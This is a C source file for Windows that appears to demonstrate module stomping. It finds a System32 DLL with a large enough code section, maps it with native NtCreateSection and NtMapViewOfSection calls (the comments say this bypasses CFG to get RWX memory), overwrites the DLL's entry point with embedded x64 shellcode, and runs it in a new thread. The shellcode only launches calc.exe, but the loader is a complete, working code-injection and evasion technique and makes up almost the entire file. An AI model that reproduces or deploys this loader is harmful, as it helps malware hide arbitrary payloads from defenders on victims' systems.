# include <windows.h>
# include <stdio.h>

# define api_error( api, msg, ... ) \
	wprintf( L"[!] " api L" failed with error: %d\n\t> MSG: " msg "\n", GetLastError(), ##__VA_ARGS__ );

# define api_ferror( api, msg, ... )																	 \
	wprintf( L"[!] " api L" failed with error: %d\n\t> MSG: " msg "\n", GetLastError(), ##__VA_ARGS__ ); \
	return -1																							 \

# define ntapi_ferror( api, status, msg, ... )														  \
	wprintf( L"[!] " api L" failed with error: 0x%0.8X\n\t> MSG: " msg "\n", status, ##__VA_ARGS__ ); \
	return -1	

# define msg( msg, ... ) \
	wprintf( L"[+] " msg L"\n", ##__VA_ARGS__ )

/* Calc.exe */
char shellcode[] = {
	0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
	0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52,
	0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
	0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed,
	0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
	0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
	0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48,
	0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1,
	0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
	0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
	0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a,
	0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
	0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b,
	0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
	0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47,
	0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e,
	0x65, 0x78, 0x65, 0x00
};

typedef NTSTATUS( NTAPI* fpNtCreateSection ) ( PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle );
typedef NTSTATUS( NTAPI* fpNtMapViewOfSection ) ( HANDLE SectionHandle, HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, int InheritDisposition, ULONG AllocationType, ULONG PageProtection );

int main()
{
	void				*hFile  = 0,
						*hFile2 = 0,
						*hHeap,
						*hThread,
						*pTargetDllEntry,
						*hSection,
						*pTargetDll,
						*pFileBuffer;
	unsigned long		ulFileSize,
						ulOldProtection,
						ulThreadId,
						ulEntry,
						ulBytesRead;
	int					Sys32Length				= lstrlen( L"C:\\Windows\\System32\\" );
	long				Status;
	size_t				ViewSize = 0;
	WIN32_FIND_DATA		FileData				= { 0 };
	PIMAGE_DOS_HEADER	DosHeader				= { 0 };
	PIMAGE_NT_HEADERS	NtHeader				= { 0 };
	wchar_t				wcDllPath[ MAX_PATH ]	= { 0 };
	
	fpNtCreateSection	 NtCreateSection	= ( fpNtCreateSection )GetProcAddress( GetModuleHandle( L"ntdll.dll" ), "NtCreateSection" );
	fpNtMapViewOfSection NtMapViewOfSection = ( fpNtMapViewOfSection )GetProcAddress( GetModuleHandle( L"ntdll.dll" ), "NtMapViewOfSection" );

	/*
		Step 1: Locate a dll file on disk which contains a suitable memory size for the payload. This process has been automated.
	*/
	if ( ( hFile = FindFirstFile( L"C:\\Windows\\System32\\*.dll", &FileData ) ) == INVALID_HANDLE_VALUE ) 
	{
		api_ferror( L"FindFirstFileW", L"Could not get a handle to C:\\Windows\\System32\\*.dll." );
	}
	
	if ( ( hHeap = GetProcessHeap() ) == NULL )
	{
		api_ferror( L"GetProcessHeap", L"Could not acquire a handle to the process heap." );
	}
	
	do
	{
		if ( Sys32Length + lstrlen( FileData.cFileName ) >= MAX_PATH )
			continue;

		swprintf_s( wcDllPath, MAX_PATH, L"C:\\Windows\\System32\\%s", FileData.cFileName );
		if ( ( hFile2 = CreateFile( wcDllPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 ) ) == INVALID_HANDLE_VALUE )
		{
			api_error( L"CreateFileW", L"Could not get a handle to %s", FileData.cFileName );
			continue;
		}

		ulFileSize = ( FileData.nFileSizeHigh * ( MAXDWORD + 1 ) ) + FileData.nFileSizeLow;
	
		if ( ( pFileBuffer = HeapAlloc( hHeap, HEAP_ZERO_MEMORY, ulFileSize ) ) == NULL )
		{
			api_error( L"HeapAlloc", L"Could not allocate enough memory on the heap for %s. (%d bytes)", FileData.cFileName, ulFileSize );
			continue;
		}

		if ( !ReadFile( hFile2, pFileBuffer, ulFileSize, &ulBytesRead, 0 ) )
		{
			api_error( L"ReadFile", L"Could not read %s into buffer at 0x%p", FileData.cFileName, pFileBuffer );
			goto Cleanup;
		}

		DosHeader = ( PIMAGE_DOS_HEADER )pFileBuffer;
		NtHeader  = ( PIMAGE_NT_HEADERS )( ( unsigned long long )pFileBuffer + DosHeader->e_lfanew );
		if ( DosHeader->e_magic != IMAGE_DOS_SIGNATURE || NtHeader->Signature != IMAGE_NT_SIGNATURE )
		{
			goto Cleanup;
		}

		/* 
			Note: Per microsofts documentation, the SizeOfCode member is 
				  'The size of the code (text) section, or the sum of all code sections if there are multiple sections.'.
				  If we're only attempting to overwrite the text section, manual section parsing for .text section via 
				  IMAGE_FIRST_SECTION should be used instead to get the size of the section.
		*/
		if ( NtHeader->OptionalHeader.SizeOfCode >= sizeof( shellcode ) )
		{
			ulEntry = NtHeader->OptionalHeader.AddressOfEntryPoint;
			msg( L"Found suitable dll for the shellcode.\n\t> DLL: %s\n\t> Text section size: %d\n\t> Shellcode Size: %zd", FileData.cFileName, NtHeader->OptionalHeader.SizeOfCode, sizeof( shellcode ) );
			break;
		}
		
	Cleanup:
		HeapFree( hHeap, 0, pFileBuffer );
	} 
	while ( FindNextFileW( hFile, &FileData ) );

	/*
		Step 2: Map the target dll to memory using syscalls to bypass CFG. There are issues with using standard CreateFileMapping/MapViewOfFile API's
			    when setting memory permissions to (RWX) outside of whats available for handle. Access permission error 5 appears on each call.
				Using syscalls avoids this, allowing us to allocate & manipulate RWX memory. This is likely due to the file handle received from 
                CreateFileW not having anything other than read permissions from user context. LoadLibrary & VirtualProtect seem work however.
	*/
	if ( ( Status = NtCreateSection( &hSection, SECTION_ALL_ACCESS, 0, 0, PAGE_READONLY, SEC_IMAGE, hFile2 ) ) != 0x0 )
	{
		ntapi_ferror( "NtCreateSection", Status, "Could not create an image section in memory for %s", FileData.cFileName );
	}
	
	if ( ( Status = NtMapViewOfSection( hSection, ( void* )-1, &pTargetDll, 0, 0, 0, &ViewSize, 1, 0, PAGE_EXECUTE_READWRITE ) ) != 0x0 )
	{
		ntapi_ferror( "NtMapViewOfSection", Status, "Could not map %s to the image section", FileData.cFileName );
	}
    /* Standard win32 loadlibrary & virtualprotect calls */
	// pTargetDll = LoadLibrary( FileData.cFileName );
	// VirtualProtect( pTargetDll, ( size_t )NtHeader->OptionalHeader.SizeOfImage, PAGE_EXECUTE_READWRITE, &ulOldProtection );

	/* 
		Step 3: Locate the entry point of the newly loaded dll 
	*/
	pTargetDllEntry = ( void* )( ( unsigned long long )pTargetDll + ulEntry );
	msg( "Mapped %s to image section.\n\t> Base: 0x%p\n\t> Entry: 0x%p", FileData.cFileName, pTargetDll, pTargetDllEntry );

	
	/*
		Step 4: Overwrite entry point of dll with payload
	*/
	if ( !VirtualProtect( pTargetDllEntry, sizeof( shellcode ), PAGE_EXECUTE_READWRITE, &ulOldProtection ) )
	{
		api_ferror( "VirtualProtect", "Could not set memory protections on dll entry 0x%p to PAGE_READWRITE", pTargetDllEntry );
	}
	memcpy( pTargetDllEntry, shellcode, sizeof( shellcode ) );
	msg( "Copied %zd bytes of shellcode to %s entry at 0x%p. Executing payload!", sizeof( shellcode ), FileData.cFileName, pTargetDllEntry );

	/* 
		Step 5: Execute the payload 
	*/
	if ( ( hThread = CreateThread( 0, 0, (LPTHREAD_START_ROUTINE)pTargetDllEntry, 0, 0, &ulThreadId ) ) == NULL )
	{
		api_ferror( "CreateThread", "Could not execute payload." );
	}
	WaitForSingleObject( hThread, INFINITE );

	msg( "Cleanly finished! Press enter to quit" );
	getchar();

	return 0;
}